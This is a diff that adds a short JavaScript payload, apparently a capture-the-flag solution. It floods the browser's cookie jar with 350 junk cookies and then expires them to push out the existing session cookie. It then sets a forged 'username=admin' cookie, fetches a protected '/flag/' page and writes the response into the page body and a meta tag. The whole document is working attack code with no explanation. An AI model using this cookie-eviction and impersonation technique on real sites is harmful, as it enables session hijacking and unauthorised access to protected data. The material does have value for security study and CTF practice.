@@ -1,0 +1,30 @@
+<script>
+(async () => {
+  const log = msg => {
+      document.body.innerText = msg;
+      const meta = document.createElement('meta');
+      meta.name = 'description';
+      meta.content = msg;
+      document.head.appendChild(meta);
+  };
+  
+  try {
+    for (let i = 0; i < 350; i++) {
+      document.cookie = `junk${i}=1; path=/; Secure; SameSite=Lax`;
+    }
+
+    for (let i = 0; i < 350; i++) {
+      document.cookie = `junk${i}=; max-age=0; path=/; Secure; SameSite=Lax`;
+    }
+
+    document.cookie = "username=admin; path=/; Secure; SameSite=Lax";
+
+    const res = await fetch('/flag/');
+    const text = await res.text();
+    log(text);
+    
+  } catch(e) {
+    log("Error: " + e);
+  }
+})();
+</script>
